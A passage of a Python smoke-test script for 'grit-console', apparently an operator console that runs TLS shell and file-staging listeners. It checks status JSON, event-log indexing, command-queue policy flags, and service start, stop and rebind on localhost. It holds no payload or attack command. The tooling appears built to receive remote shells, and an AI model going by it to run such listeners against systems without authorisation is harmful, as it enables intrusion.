        events_by_detail_command_id = queue_status_json.get("events_by_detail_command_id") or {}
        events_by_detail_command_sha256 = queue_status_json.get("events_by_detail_command_sha256") or {}
        events_by_event_detail_command_id = queue_status_json.get("events_by_event_detail_command_id") or {}
        events_by_service_detail_command_id = queue_status_json.get("events_by_service_detail_command_id") or {}
        events_by_event_detail_command_sha256 = queue_status_json.get("events_by_event_detail_command_sha256") or {}
        events_by_service_detail_command_sha256 = queue_status_json.get("events_by_service_detail_command_sha256") or {}
        events_api = (queue_status_json.get("api_collections") or {}).get("events") or {}
        first_tail_event = (queue_status_json.get("events") or [{}])[0]
        first_tail_event_id = first_tail_event.get("id", "")
        if (not first_tail_event_id or
                events_by_id.get(first_tail_event_id, {}).get("event") != first_tail_event.get("event") or
                not events_by_service.get("command-queue") or
                not events_by_event.get("command_queue_queued") or
                not events_by_event.get("command_result_received") or
                not events_by_level.get("info") or
                not events_by_service_event.get("command-queue:command_queue_queued") or
                not events_by_service_event.get("command-queue:command_result_received") or
                not events_by_service_level.get("command-queue:info") or
                not events_by_event_level.get("command_queue_queued:info") or
                events_by_detail_command_id.get(command_id, [{}])[-1].get("event") != "command_result_received" or
                events_by_detail_command_sha256.get(expected_command_sha, [{}])[-1].get("event") != "command_result_received" or
                not events_by_event_detail_command_id.get(f"command_result_received:{command_id}") or
                not events_by_event_detail_command_sha256.get(f"command_result_received:{expected_command_sha}") or
                not events_by_service_detail_command_id.get(f"command-queue:{command_id}") or
                not events_by_service_detail_command_sha256.get(f"command-queue:{expected_command_sha}") or
                "events_by_service_level" not in (events_api.get("indexes") or []) or
                "events_by_event_level" not in (events_api.get("indexes") or []) or
                "events_by_remote_event" not in (events_api.get("indexes") or []) or
                "events_by_remote_level" not in (events_api.get("indexes") or []) or
                "events_by_detail_command_id" not in (events_api.get("indexes") or []) or
                "events_by_detail_command_sha256" not in (events_api.get("indexes") or []) or
                "events_by_event_detail_command_id" not in (events_api.get("indexes") or []) or
                "events_by_event_detail_command_sha256" not in (events_api.get("indexes") or []) or
                "events_by_service_detail_command_id" not in (events_api.get("indexes") or []) or
                "events_by_service_detail_command_sha256" not in (events_api.get("indexes") or [])):
            print("server json status missing event tail lookup indexes", file=sys.stderr)
            print(queue_status_doc.stdout, file=sys.stderr)
            return 1
        if events_by_remote_event or events_by_remote_level:
            print("command queue status unexpectedly had remote event indexes before remote traffic", file=sys.stderr)
            print(queue_status_doc.stdout, file=sys.stderr)
            return 1
        truncated_event_dir = Path(tmp) / "truncated-events"
        truncated_event_dir.mkdir()
        truncated_event_log = truncated_event_dir / "events.jsonl"
        with truncated_event_log.open("w", encoding="utf-8") as fh:
            for idx in range(15):
                fh.write(json.dumps({
                    "schema": 1,
                    "id": f"evt-trunc-{idx}",
                    "ts": f"2026-05-26T12:00:{idx:02d}Z",
                    "service": "smoke",
                    "session": "sess-trunc",
                    "session_path": "",
                    "event": "truncated_tail_probe",
                    "level": "info",
                    "remote": "198.51.100.7:1234",
                    "details": {"idx": idx},
                }, sort_keys=True) + "\n")
        truncated_event_cfg = Path(tmp) / "server-config-truncated-events.json"
        truncated_event_cfg.write_text(json.dumps({
            "listen_host": "127.0.0.1",
            "operator_session_dir": str(truncated_event_dir),
            "session_root": str(Path(tmp) / "truncated-event-sessions"),
        }), encoding="utf-8")
        truncated_event_status = run(
            "scripts/grit-console",
            "--config", str(truncated_event_cfg),
            "--json-status",
        )
        truncated_event_doc = json.loads(truncated_event_status.stdout)
        truncated_stats = truncated_event_doc.get("event_log_stats") or {}
        truncated_state = truncated_event_doc.get("event_log_state") or {}
        if (truncated_stats.get("total_count") != 15 or
                truncated_stats.get("tail_count") != 12 or
                truncated_stats.get("tail_truncated") is not True or
                truncated_stats.get("tail_omitted_count") != 3 or
                truncated_stats.get("by_session_level", {}).get("sess-trunc:info") != 15 or
                truncated_stats.get("by_remote_event", {}).get("198.51.100.7:1234:truncated_tail_probe") != 15 or
                truncated_stats.get("by_remote_level", {}).get("198.51.100.7:1234:info") != 15 or
                truncated_state.get("tail_truncated") is not True or
                truncated_state.get("tail_omitted_count") != 3 or
                truncated_state.get("tail_has_records") is not True or
                truncated_state.get("tail_has_omitted_records") is not True or
                truncated_state.get("tail_empty_due_to_limit") is not False or
                truncated_event_doc.get("summary", {}).get("event_tail_truncated") is not True or
                truncated_event_doc.get("summary", {}).get("event_tail_omitted_count") != 3 or
                truncated_event_doc.get("summary", {}).get("event_tail_has_records") is not True or
                truncated_event_doc.get("summary", {}).get("event_tail_has_omitted_records") is not True or
                truncated_event_doc.get("summary", {}).get("event_tail_empty_due_to_limit") is not False or
                truncated_event_doc.get("event_log_state_records_by_tail_truncated", {}).get("True", [{}])[0].get("tail_omitted_count") != 3 or
                truncated_event_doc.get("event_log_state_records_by_tail_has_omitted_records", {}).get("True", [{}])[0].get("tail_omitted_count") != 3 or
                truncated_event_doc.get("summary", {}).get("event_session_level_counts", {}).get("sess-trunc:info") != 15 or
                truncated_event_doc.get("summary", {}).get("event_remote_event_counts", {}).get("198.51.100.7:1234:truncated_tail_probe") != 15 or
                truncated_event_doc.get("summary", {}).get("event_remote_level_counts", {}).get("198.51.100.7:1234:info") != 15 or
                truncated_event_doc.get("events_by_session_level", {}).get("sess-trunc:info", [{}])[0].get("id") != "evt-trunc-3" or
                truncated_event_doc.get("events_by_remote_event", {}).get("198.51.100.7:1234:truncated_tail_probe", [{}])[0].get("id") != "evt-trunc-3" or
                truncated_event_doc.get("events_by_remote_level", {}).get("198.51.100.7:1234:info", [{}])[0].get("id") != "evt-trunc-3" or
                "events_by_session_level" not in (((truncated_event_doc.get("api_collections") or {}).get("events") or {}).get("indexes") or []) or
                (truncated_event_doc.get("events") or [{}])[0].get("id") != "evt-trunc-3"):
            print("server json status missing explicit truncated event tail metadata", file=sys.stderr)
            print(truncated_event_status.stdout, file=sys.stderr)
            return 1
        limited_event_status = run(
            "scripts/grit-console",
            "--config", str(truncated_event_cfg),
            "--json-status",
            "--event-limit", "5",
        )
        limited_event_doc = json.loads(limited_event_status.stdout)
        limited_stats = limited_event_doc.get("event_log_stats") or {}
        if (limited_stats.get("tail_limit") != 5 or
                limited_stats.get("tail_count") != 5 or
                limited_stats.get("tail_omitted_count") != 10 or
                limited_event_doc.get("event_log_state", {}).get("tail_has_omitted_records") is not True or
                limited_event_doc.get("summary", {}).get("event_tail_count") != 5 or
                (limited_event_doc.get("events") or [{}])[0].get("id") != "evt-trunc-10"):
            print("server json status did not honor --event-limit", file=sys.stderr)
            print(limited_event_status.stdout, file=sys.stderr)
            return 1
        zero_event_status = run(
            "scripts/grit-console",
            "--config", str(truncated_event_cfg),
            "--json-status",
            "--event-limit", "0",
        )
        zero_event_doc = json.loads(zero_event_status.stdout)
        zero_stats = zero_event_doc.get("event_log_stats") or {}
        if (zero_stats.get("tail_limit") != 0 or
                zero_stats.get("tail_count") != 0 or
                zero_stats.get("tail_omitted_count") != 15 or
                zero_event_doc.get("event_log_state", {}).get("tail_empty_due_to_limit") is not True or
                zero_event_doc.get("summary", {}).get("event_tail_empty_due_to_limit") is not True or
                zero_event_doc.get("event_log_state_records_by_tail_empty_due_to_limit", {}).get("True", [{}])[0].get("tail_omitted_count") != 15 or
                zero_event_doc.get("events") != []):
            print("server json status did not honor --event-limit 0", file=sys.stderr)
            print(zero_event_status.stdout, file=sys.stderr)
            return 1
        zero_event_text = run(
            "scripts/grit-console",
            "--config", str(truncated_event_cfg),
            "--status",
            "--event-limit", "0",
        )
        if (zero_event_text.returncode != 0 or
                "tail_has_records=no" not in zero_event_text.stdout or
                "tail_has_omitted=yes" not in zero_event_text.stdout or
                "tail_empty_due_to_limit=yes" not in zero_event_text.stdout):
            print("text --status missing event-tail availability state", file=sys.stderr)
            print(zero_event_text.stdout, file=sys.stderr)
            return 1
        zero_event_workbench = run(
            "scripts/grit-console",
            "--config", str(truncated_event_cfg),
            "--event-limit", "0",
        )
        if (zero_event_workbench.returncode != 0 or
                "tail_has_records=no" not in zero_event_workbench.stdout or
                "tail_has_omitted=yes" not in zero_event_workbench.stdout or
                "tail_empty_due_to_limit=yes" not in zero_event_workbench.stdout):
            print("workbench fallback missing event-tail availability state", file=sys.stderr)
            print(zero_event_workbench.stdout, file=sys.stderr)
            return 1
        negative_event_limit = run(
            "scripts/grit-console",
            "--config", str(truncated_event_cfg),
            "--json-status",
            "--event-limit", "-1",
        )
        if negative_event_limit.returncode != 2 or "--event-limit must be >= 0" not in negative_event_limit.stderr:
            print("server json status did not reject a negative --event-limit", file=sys.stderr)
            print(negative_event_limit.stdout, file=sys.stderr)
            print(negative_event_limit.stderr, file=sys.stderr)
            return 1
        event_log_path = Path(paths["event_log"])
        previous_invalid = int(event_stats.get("invalid_count", 0))
        with event_log_path.open("a", encoding="utf-8") as fh:
            fh.write("not-json\n")
        invalid_event_status = run(
            "scripts/grit-console",
            "--config", str(cfg),
            "--command-queue-file", str(queue_file),
            "--json-status",
        )
        invalid_event_doc = json.loads(invalid_event_status.stdout)
        invalid_event_warnings = [
            item for item in invalid_event_doc.get("warnings", [])
            if item.get("type") == "invalid_event_log"
        ]
        expected_invalid = previous_invalid + 1
        if (invalid_event_doc.get("summary", {}).get("event_invalid_count") != expected_invalid or
                invalid_event_doc.get("summary", {}).get("event_log_valid") is not False or
                (invalid_event_doc.get("event_log_state") or {}).get("valid") is not False or
                (invalid_event_doc.get("event_log_state") or {}).get("invalid_count") != expected_invalid or
                (invalid_event_doc.get("event_log_state") or {}).get("has_invalid_records") is not True or
                invalid_event_doc.get("event_log_state_records_by_has_invalid_records", {}).get("True", [{}])[0].get("invalid_count") != expected_invalid or
                not invalid_event_warnings or
                invalid_event_warnings[-1].get("path") != str(event_log_path) or
                invalid_event_warnings[-1].get("invalid_count") != expected_invalid):
            print("server json status missing invalid event log warning", file=sys.stderr)
            print(invalid_event_status.stdout, file=sys.stderr)
            return 1
        invalid_event_text = run(
            "scripts/grit-console",
            "--config", str(cfg),
            "--command-queue-file", str(queue_file),
            "--status",
        )
        if f"event log contains {expected_invalid} invalid JSONL record" not in invalid_event_text.stdout:
            print("text --status missing invalid event log warning", file=sys.stderr)
            print(invalid_event_text.stdout, file=sys.stderr)
            return 1
        api_status_doc = run(
            "scripts/grit-console",
            "--config", str(cfg),
            "--command-queue-file", str(queue_file),
            "--api-status",
        )
        if api_status_doc.returncode != 0 or json.loads(api_status_doc.stdout)["schema"] != 1:
            print("--api-status did not return status JSON", file=sys.stderr)
            print(api_status_doc.stdout, file=sys.stderr)
            print(api_status_doc.stderr, file=sys.stderr)
            return 1
        queue_status_text = run(
            "scripts/grit-console",
            "--config", str(cfg),
            "--command-queue-file", str(queue_file),
            "--status",
        )
        if ("Command queue:" not in queue_status_text.stdout or
                "Path health:" not in queue_status_text.stdout or
                "Operator state:" not in queue_status_text.stdout or
                "command_queue: status=ok kind=json-state" not in queue_status_text.stdout or
                "event_log: status=invalid kind=jsonl-log" not in queue_status_text.stdout or
                "session_root: status=ok kind=directory" not in queue_status_text.stdout or
                "state_file: exists=" not in queue_status_text.stdout or
                "API resources: schema=1 resources=" not in queue_status_text.stdout or
                "collections_key=api_collections resources_key=api_resources" not in queue_status_text.stdout or
                "command_queue_commands: records=command_queue.commands" not in queue_status_text.stdout or
                "summary=command_queue_total_count" not in queue_status_text.stdout or
                "enabled=no default_enabled=no" not in queue_status_text.stdout or
                "require_token=yes token_configured=no token_source=manual" not in queue_status_text.stdout or
                "allowed_commands=none execution_mode=metadata-only allow_arbitrary=no active_control_channel=no" not in queue_status_text.stdout or
                "policy_valid=yes configured_for_polling=no arbitrary_policy_requested=no arbitrary_execution_allowed=no" not in queue_status_text.stdout or
                "transport_support: poll=no live_polling=no" not in queue_status_text.stdout or
                "grit reality-test --json" not in queue_status_text.stdout or
                "result-received" not in queue_status_text.stdout or
                "result_output=12 limit=1234 exceeded_limit=no" not in queue_status_text.stdout or
                "command_limits: timeouts=9=1 max_output=1234=1 expire_sec=0=1" not in queue_status_text.stdout or
                "result_size_buckets: small=1" not in queue_status_text.stdout or
                "latest_created=" not in queue_status_text.stdout or
                "latest_result=" not in queue_status_text.stdout or
                "modes: total=5 would_poll_if_configured=3 operator_host_required=3 delivery_supported=0 result_upload_supported=5 execution_supported=0 active_control_channel=0" not in queue_status_text.stdout or
                "mode status: lifecycle=inspect requires_operator_host=no would_poll_if_configured=no execution_supported=no active_control_channel=no" not in queue_status_text.stdout or
                "mode daemon: lifecycle=long-running requires_operator_host=yes would_poll_if_configured=yes execution_supported=no active_control_channel=no" not in queue_status_text.stdout or
                "mode stop: lifecycle=stop requires_operator_host=no would_poll_if_configured=no execution_supported=no active_control_channel=no" not in queue_status_text.stdout or
                "command_result_received" not in queue_status_text.stdout or
                "Event log:" not in queue_status_text.stdout or
                "command-queue=" not in queue_status_text.stdout or
                "command_queue_queued=" not in queue_status_text.stdout or
                "levels: info=" not in queue_status_text.stdout or
                "detail_command_ids:" not in queue_status_text.stdout or
                f"{command_id}=2" not in queue_status_text.stdout or
                "detail_command_sha256:" not in queue_status_text.stdout or
                expected_command_sha not in queue_status_text.stdout or
                f"command_id={command_id}" not in queue_status_text.stdout or
                f"command_sha256={expected_command_sha}" not in queue_status_text.stdout or
                "first=" not in queue_status_text.stdout or
                "latest=" not in queue_status_text.stdout or
                "tls=yes" not in queue_status_text.stdout or
                "tls=no" not in queue_status_text.stdout):
            print("text --status missing command queue/event sections", file=sys.stderr)
            print(queue_status_text.stdout, file=sys.stderr)
            return 1
        cleared = run(
            "scripts/grit-console",
            "--config", str(cfg),
            "--command-queue-file", str(queue_file),
            "--clear-command-queue",
        )
        if cleared.returncode != 0 or "cleared 1 command queue entry" not in cleared.stdout:
            print("operator command queue clear failed", file=sys.stderr)
            return 1

        if args.section == "integration-daemon-status":
            print("grit-console smoke integration-daemon-status ok")
            return 0

        # Test: cert already present → server does not regenerate (no generation message)
        result_existing = run("scripts/grit-console", "--config", str(cfg),
                              "--transport", "tls-shell", "--timeout", "0.05")
        if "Generating" in result_existing.stderr or "generating" in result_existing.stderr:
            print("Server re-generated existing cert:", file=sys.stderr)
            return 1

        # Test: legacy socat_listen_port field accepted (compat)
        cfg2 = Path(tmp) / "server-config-legacy.json"
        cfg2.write_text(json.dumps({
            "GRIT_RSHELL_TRANSPORT": "tls-shell",
            "listen_host": "127.0.0.1",
            "socat_listen_port": port2,
            "session_root": str(Path(tmp) / "sessions"),
            "tls_cert": str(cert_path),
            "tls_key": str(key_path),
        }), encoding="utf-8")
        result2 = run("scripts/grit-console", "--config", str(cfg2),
                      "--transport", "tls-shell", "--timeout", "0.05")
        # Should start without error (cert already exists from above)
        if result2.returncode not in (0, None) and "Error" in result2.stderr:
            print("Legacy socat_listen_port field not accepted:", file=sys.stderr)
            print(result2.stdout, file=sys.stderr)
            print(result2.stderr, file=sys.stderr)
            return 1

        lifecycle_port = free_port()
        lifecycle_cfg = Path(tmp) / "server-config-lifecycle.json"
        lifecycle_state = Path(tmp) / "operator-session" / "lifecycle-state.json"
        lifecycle_staged = Path(tmp) / "operator-session" / "lifecycle-staged.json"
        lifecycle_cfg.write_text(json.dumps({
            "listen_host": "127.0.0.1",
            "GRIT_OPERATOR_FILE_SERVICE_PORT": lifecycle_port,
            "session_root": str(Path(tmp) / "sessions-lifecycle"),
            "tls_cert": str(cert_path),
            "tls_key": str(key_path),
            "GRIT_OPERATOR_FILE_SERVICE_TLS": "no",
            "operator_session_dir": str(Path(tmp) / "operator-session"),
        }), encoding="utf-8")
        lifecycle_proc = subprocess.Popen(
            [
                str(server), "--config", str(lifecycle_cfg),
                "--state-file", str(lifecycle_state),
                "--staged-file", str(lifecycle_staged),
                "--transport", "file-service",
                "--file-service-tls", "no",
                "--managed-by", "workbench-smoke",
                "--process-log", str(Path(tmp) / "operator-session" / "file-service-workbench.log"),
                "--timeout", "30",
            ],
            cwd=ROOT,
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        status_doc = None
        deadline = time.time() + 5
        while time.time() < deadline:
            status = run(
                "scripts/grit-console", "--config", str(lifecycle_cfg),
                "--state-file", str(lifecycle_state),
                "--staged-file", str(lifecycle_staged),
                "--json-status",
            )
            if status.returncode == 0:
                status_doc = json.loads(status.stdout)
                rows = {row["name"]: row for row in status_doc["services"]}
                if rows["file-service"]["actual"] == "listening" and rows["file-service"].get("pid"):
                    break
            time.sleep(0.05)
        else:
            print("lifecycle file-service did not reach listening state", file=sys.stderr)
            lifecycle_proc.terminate()
            try:
                lifecycle_proc.communicate(timeout=2)
            except subprocess.TimeoutExpired:
                lifecycle_proc.kill()
                lifecycle_proc.communicate(timeout=2)
            return 1
        rows = {row["name"]: row for row in status_doc["services"]}
        if not rows["file-service"].get("pid"):
            print("status missing file-service pid", file=sys.stderr)
            lifecycle_proc.terminate()
            return 1
        lifecycle_server_state = status_doc.get("server_state") or {}
        if (lifecycle_server_state.get("valid") is not True or
                lifecycle_server_state.get("service_count", 0) < 1 or
                lifecycle_server_state.get("services", {}).get("file-service", {}).get("status") != "listening" or
                status_doc.get("summary", {}).get("server_state_valid") is not True):
            print("status missing live reusable server-state record", file=sys.stderr)
            print(status.stdout, file=sys.stderr)
            lifecycle_proc.terminate()
            return 1
        lifecycle_actions_by_id = status_doc.get("service_workflow_actions_by_id") or {}
        lifecycle_file_actions = (status_doc.get("service_workflow_actions_by_service") or {}).get("file-service") or []
        if (len(lifecycle_file_actions) != 3 or
                status_doc.get("summary", {}).get("service_workflow_action_count") != expected_service_workflow_action_count or
                status_doc.get("summary", {}).get("service_workflow_action_operator_action_state_counts", {}).get("already-running") != 1 or
                status_doc.get("summary", {}).get("service_workflow_action_operator_action_reason_counts", {}).get("already-listening") != 1 or
                lifecycle_actions_by_id.get("file-service:start-service", {}).get("operator_action_state") != "already-running" or
                lifecycle_actions_by_id.get("file-service:start-service", {}).get("can_run_from_curses_enter") is not False or
                lifecycle_actions_by_id.get("file-service:stop-service", {}).get("operator_action_state") != "ready" or
                lifecycle_actions_by_id.get("file-service:stop-service", {}).get("can_run_from_curses_enter") is not True or
                lifecycle_actions_by_id.get("file-service:stop-service", {}).get("command") != f"scripts/grit-console --config {str(lifecycle_cfg)} --stop-service file-service"):
            print("status missing live service workflow action readiness", file=sys.stderr)
            print(status.stdout, file=sys.stderr)
            lifecycle_proc.terminate()
            return 1
        state_doc = json.loads(lifecycle_state.read_text(encoding="utf-8"))
        state_service = state_doc.get("services", {}).get("file-service", {})
        if (state_service.get("managed_by") != "workbench-smoke" or
                not state_service.get("process_log", "").endswith("file-service-workbench.log")):
            print("listening child state did not preserve workbench ownership metadata", file=sys.stderr)
            print(json.dumps(state_service, indent=2), file=sys.stderr)
            lifecycle_proc.terminate()
            return 1
        listener_processes = rows["file-service"].get("listener_processes") or []
        if (not rows["file-service"].get("listener_pids") or
                not listener_processes or
                not listener_processes[0].get("process_name") or
                not listener_processes[0].get("exe") or
                "cmdline" not in listener_processes[0]):
            print("status missing actual listener pid/process details", file=sys.stderr)
            lifecycle_proc.terminate()
            return 1
        recorded_pid = str(rows["file-service"].get("pid"))
        listener_pid = str(rows["file-service"].get("listener_pids", [""])[0])
        if ((status_doc.get("services_by_pid") or {}).get(recorded_pid, [{}])[0].get("name") != "file-service" or
                (status_doc.get("services_by_listener_pid") or {}).get(listener_pid, [{}])[0].get("name") != "file-service"):
            print("status missing service PID lookup indexes", file=sys.stderr)
            print(status.stdout, file=sys.stderr)
            lifecycle_proc.terminate()
            return 1
        lifecycle_summary = status_doc.get("summary") or {}
        if (not any(row.get("name") == "file-service" for row in (status_doc.get("services_by_bind_address") or {}).get("127.0.0.1", [])) or
                not any(row.get("name") == "tls-shell" for row in (status_doc.get("services_by_tls") or {}).get("yes", [])) or
                not any(row.get("name") == "file-service" for row in (status_doc.get("services_by_tls") or {}).get("no", [])) or
                not any(row.get("name") == "file-service" for row in (status_doc.get("services_by_stale") or {}).get("no", [])) or
                not any(row.get("name") == "file-service" for row in (status_doc.get("services_by_pid_alive") or {}).get("yes", [])) or
                not any(row.get("name") == "file-service" for row in (status_doc.get("services_by_pid_managed") or {}).get("yes", [])) or
                not any(row.get("name") == "file-service" for row in (status_doc.get("services_by_listener_bind_mismatch") or {}).get("no", [])) or
                not any(row.get("name") == "file-service" for row in (status_doc.get("services_by_session_log_exists") or {}).get("yes", [])) or
                not any(row.get("name") == "file-service" for row in (status_doc.get("services_by_process_log_exists") or {}).get("no", [])) or
                rows["file-service"].get("session_log_exists") is not True or
                rows["file-service"].get("process_log_exists") is not False or
                (status_doc.get("services_by_name") or {}).get("file-service", {}).get("session_log_exists") is not True or
                (status_doc.get("services_by_name") or {}).get("file-service", {}).get("process_log_exists") is not False or
                len((status_doc.get("services_by_has_error") or {}).get("no", [])) != expected_service_count or
                lifecycle_summary.get("service_bind_address_counts", {}).get("127.0.0.1") != expected_service_count or
                lifecycle_summary.get("service_tls_counts", {}).get("yes") != 2 or
                lifecycle_summary.get("service_tls_counts", {}).get("no") != expected_service_count - 2 or
                lifecycle_summary.get("service_pid_alive_counts", {}).get("yes") != 1 or
                lifecycle_summary.get("service_pid_managed_counts", {}).get("yes") != 1 or
                lifecycle_summary.get("service_session_log_exists_counts", {}).get("yes") != 1 or
                lifecycle_summary.get("service_process_log_exists_counts", {}).get("no") != expected_service_count):
            print("status missing service lifecycle/filter indexes", file=sys.stderr)
            print(status.stdout, file=sys.stderr)
            lifecycle_proc.terminate()
            return 1
        endpoints = rows["file-service"].get("listener_endpoints") or []
        if not any(endpoint.get("address") == "127.0.0.1" and endpoint.get("port") == lifecycle_port for endpoint in endpoints):
            print("status missing actual listener endpoint address/port", file=sys.stderr)
            lifecycle_proc.terminate()
            return 1
        lifecycle_ports_by_number = status_doc.get("ports_by_number") or {}
        lifecycle_port_rows = lifecycle_ports_by_number.get(str(lifecycle_port)) or []
        if (not lifecycle_port_rows or
                lifecycle_port_rows[0].get("service") != "file-service" or
                lifecycle_port_rows[0].get("actual") != "listening" or
                lifecycle_port_rows[0].get("listener_endpoints") != endpoints):
            print("status missing explicit listening port record", file=sys.stderr)
            print(status.stdout, file=sys.stderr)
            lifecycle_proc.terminate()
            return 1
        if not any(endpoint.get("pids") for endpoint in endpoints):
            print("status listener endpoints missing owning PIDs", file=sys.stderr)
            lifecycle_proc.terminate()
            return 1
        if rows["file-service"].get("tls") is not False or rows["tls-shell"].get("tls") is not True:
            print("status missing normalized service TLS flags", file=sys.stderr)
            lifecycle_proc.terminate()
            return 1
        lifecycle_status_text = run(
            "scripts/grit-console", "--config", str(lifecycle_cfg),
            "--state-file", str(lifecycle_state),
            "--staged-file", str(lifecycle_staged),
            "--status",
        )
        if f"listener=127.0.0.1:{lifecycle_port}" not in lifecycle_status_text.stdout:
            print("text status missing actual listener endpoint", file=sys.stderr)
            print(lifecycle_status_text.stdout, file=sys.stderr)
            lifecycle_proc.terminate()
            return 1
        dup_start = subprocess.run(
            [
                sys.executable,
                "-c",
                (
                    "import importlib.machinery, importlib.util, pathlib, sys; "
                    "p=pathlib.Path(sys.argv[1]); "
                    "loader=importlib.machinery.SourceFileLoader('srv', str(p)); "
                    "spec=importlib.util.spec_from_loader('srv', loader); "
                    "m=importlib.util.module_from_spec(spec); spec.loader.exec_module(m); "
                    "cfg=m.load_config(sys.argv[2]); "
                    "cfg['_config_path']=sys.argv[2]; "
                    "cfg['server_state']=sys.argv[3]; "
                    "cfg['staged_files']=sys.argv[4]; "
                    "m.start_service_process(cfg, 'file-service')"
                ),
                str(server),
                str(lifecycle_cfg),
                str(lifecycle_state),
                str(lifecycle_staged),
            ],
            cwd=ROOT,
            text=True,
            capture_output=True,
        )
        if dup_start.returncode != 0 or "already listening" not in dup_start.stdout:
            print("workbench duplicate service start was not skipped cleanly", file=sys.stderr)
            print(dup_start.stdout, file=sys.stderr)
            print(dup_start.stderr, file=sys.stderr)
            lifecycle_proc.terminate()
            return 1
        dup_state = json.loads(lifecycle_state.read_text(encoding="utf-8"))
        if dup_state.get("services", {}).get("file-service", {}).get("pid") != rows["file-service"].get("pid"):
            print("duplicate service start changed recorded listener pid", file=sys.stderr)
            lifecycle_proc.terminate()
            return 1
        dup_events = [json.loads(line) for line in (Path(tmp) / "operator-session" / "events.jsonl").read_text(encoding="utf-8").splitlines()]
        if not any(event.get("event") == "service_start_skipped" and event.get("details", {}).get("reason") == "already-listening" for event in dup_events):
            print("duplicate service start did not log service_start_skipped", file=sys.stderr)
            lifecycle_proc.terminate()
            return 1
        stop = run(
            "scripts/grit-console", "--config", str(lifecycle_cfg),
            "--state-file", str(lifecycle_state),
            "--staged-file", str(lifecycle_staged),
            "--stop",
        )
        if (stop.returncode != 0 or
                "stopped pid" not in stop.stdout or
                "port released" not in stop.stdout or
                "Stop summary: stopped=1 skipped=0 failed=0" not in stop.stdout):
            print("--stop did not stop managed listener", file=sys.stderr)
            print(stop.stdout, file=sys.stderr)
            print(stop.stderr, file=sys.stderr)
            lifecycle_proc.terminate()
            return 1
        stdout_life, stderr_life = lifecycle_proc.communicate(timeout=5)
        if lifecycle_proc.returncode not in (0, -15):
            print("managed listener exited unexpectedly after --stop", file=sys.stderr)
            print(stdout_life, file=sys.stderr)
            print(stderr_life, file=sys.stderr)
            return 1
        lifecycle_events_path = Path(tmp) / "operator-session" / "events.jsonl"
        lifecycle_events = [json.loads(line) for line in lifecycle_events_path.read_text(encoding="utf-8").splitlines()]
        shutdown_events = [
            event for event in lifecycle_events
            if event.get("service") == "file-service" and event.get("event") == "shutdown"
        ]
        if not shutdown_events or shutdown_events[-1].get("details", {}).get("reason") != "SIGTERM":
            print("--stop did not leave a structured SIGTERM shutdown event", file=sys.stderr)
            return 1
        service_stop_events = [
            event for event in lifecycle_events
            if event.get("service") == "file-service" and event.get("event") == "service_stop"
        ]
        if not service_stop_events or service_stop_events[-1].get("details", {}).get("port_released") is not True:
            print("--stop did not record that the listener port was released", file=sys.stderr)
            return 1
        status_after = run(
            "scripts/grit-console", "--config", str(lifecycle_cfg),
            "--state-file", str(lifecycle_state),
            "--staged-file", str(lifecycle_staged),
            "--json-status",
        )
        status_after_doc = json.loads(status_after.stdout)
        rows_after = {row["name"]: row for row in status_after_doc["services"]}
        if rows_after["file-service"]["actual"] == "listening":
            print("file-service port still listening after --stop", file=sys.stderr)
            return 1
        stopped_state = (status_after_doc.get("server_state", {}).get("services", {}).get("file-service") or {})
        if stopped_state.get("pid") or stopped_state.get("managed_by") or not stopped_state.get("stopped_at"):
            print("--stop did not clear stopped service ownership fields", file=sys.stderr)
            print(status_after.stdout, file=sys.stderr)
            return 1
        if (not rows_after["file-service"].get("process_log", "").endswith("file-service-workbench.log") or
                not rows_after["file-service"].get("session_log")):
            print("stopped status lost service log context", file=sys.stderr)
            print(status_after.stdout, file=sys.stderr)
            return 1
        rebind = subprocess.Popen(
            [
                str(server), "--config", str(lifecycle_cfg),
                "--state-file", str(lifecycle_state),
                "--staged-file", str(lifecycle_staged),
                "--transport", "file-service",
                "--file-service-tls", "no",
                "--one-shot",
                "--timeout", "5",
            ],
            cwd=ROOT,
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        missing_request = b"GET /fetch?name=missing HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n"
        response_rebind = connect_with_retry(lifecycle_port, missing_request)
        stdout_rebind, stderr_rebind = rebind.communicate(timeout=5)
        if rebind.returncode != 0 or b"HTTP/1.1 404" not in response_rebind:
            print("file-service did not rebind cleanly after --stop", file=sys.stderr)
            print(stdout_rebind, file=sys.stderr)
            print(stderr_rebind, file=sys.stderr)
            return 1

        sigint_port = free_port()
        sigint_cfg = Path(tmp) / "server-config-foreground-sigint.json"
        sigint_state = Path(tmp) / "operator-session" / "foreground-sigint-state.json"
        sigint_staged = Path(tmp) / "operator-session" / "foreground-sigint-staged.json"
        sigint_sessions = Path(tmp) / "sessions-foreground-sigint"
        sigint_cfg.write_text(json.dumps({
            "listen_host": "127.0.0.1",
            "GRIT_OPERATOR_FILE_SERVICE_PORT": sigint_port,
            "session_root": str(sigint_sessions),
            "tls_cert": str(cert_path),
            "tls_key": str(key_path),
            "GRIT_OPERATOR_FILE_SERVICE_TLS": "no",
            "operator_session_dir": str(Path(tmp) / "operator-session"),
        }), encoding="utf-8")
        sigint_proc = subprocess.Popen(
            [
                str(server),
                "--config", str(sigint_cfg),
                "--state-file", str(sigint_state),
                "--staged-file", str(sigint_staged),
                "--transport", "file-service",
                "--file-service-tls", "no",
            ],
            cwd=ROOT,
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        deadline = time.time() + 5
        while time.time() < deadline:
            sigint_status = run(
                "scripts/grit-console",
                "--config", str(sigint_cfg),
                "--state-file", str(sigint_state),
                "--staged-file", str(sigint_staged),
                "--json-status",
            )
            if sigint_status.returncode == 0:
                sigint_status_doc = json.loads(sigint_status.stdout)
                sigint_rows = {row["name"]: row for row in sigint_status_doc.get("services", [])}
                if sigint_rows.get("file-service", {}).get("actual") == "listening":
                    break
            time.sleep(0.05)
        else:
            sigint_proc.terminate()
            print("foreground SIGINT test listener did not start", file=sys.stderr)
            return 1
        sigint_proc.send_signal(signal.SIGINT)
        sigint_stdout, sigint_stderr = sigint_proc.communicate(timeout=5)
        if sigint_proc.returncode != 0 or "Traceback" in (sigint_stderr or ""):
            print("foreground file-service SIGINT did not exit cleanly", file=sys.stderr)
            print(sigint_stdout, file=sys.stderr)
            print(sigint_stderr, file=sys.stderr)
            return 1
        sigint_state_doc = json.loads(sigint_state.read_text(encoding="utf-8"))
        sigint_service = sigint_state_doc.get("services", {}).get("file-service", {})
        if (sigint_service.get("status") != "stopped" or
                sigint_service.get("stopped_reason") != "SIGINT" or
